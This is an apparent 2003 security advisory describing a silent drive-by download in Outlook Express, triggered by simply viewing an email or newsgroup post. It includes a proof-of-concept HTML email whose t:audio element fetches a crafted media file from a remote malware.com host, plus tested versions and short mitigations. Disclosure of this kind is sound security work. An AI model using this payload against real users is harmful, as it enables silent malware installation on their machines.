Subject: Restricted Zone: the OUTLOOK EXPRESS




Tuesday, 20 May, 2003


Silent delivery and installation of an executable on a target 
computer. No client input other than opening an email or newsgroup 
post.

This can be achieved with the default setting of Outlook Express: 
RESTRICTED ZONE.

Technically the following never worked, cannot work, shouldn't work. 
But it does:

MIME-Version: 1.0
Content-Type: text/html;
Content-Transfer-Encoding: 7bit
X-Source: 05.19.03  http://www..malware.com 

<html xmlns:t>
<head><style>
t\:*{behavior:url(#default#time);display:none}</style></head><body>
<t:audio  t:src="http://www.malware.com/freek.asf"  />
</body></html>

What that does is invoke our freakish media file including our trusty 
and battle-hardened 0s URL flip from within the html of an email or 
newsgroup post on viewing, which ordinarily could never be done.

But it now appears that while custom-crafted media files fail, 
modified third-party files [whatever that means] function according 
to plan. Specifically audio + *.asf. Our 0s URL flip points to our 
file on the remote server and automatically forces our download as 
instructed. Couple that with the most recent flood-like functionality 
of the iframe: http://www.securityfocus.com/archive/1/321662 and 
that's the end of that.

Tested on:

Outlook Express 6.00.2800.1123 and all of its 'patches'
with WMP 7.01.00.3055 and 8.00.00.4487 [WMP 9 fails]

First Step Working Example:

Notes:

1. this is reminiscent of GreyMagic Software's 'Qualcomm Eudora 
WebBrowser Control Embedded Media Player File Vulnerability ': 
http://www.securityfocus.com/bid/4343 which appears to never have 
been patched.

2. disable scripting in the media player [if it helps]

3. do not be lured into opening email and newsgroup posts from 
untrustworthy sources


End Call
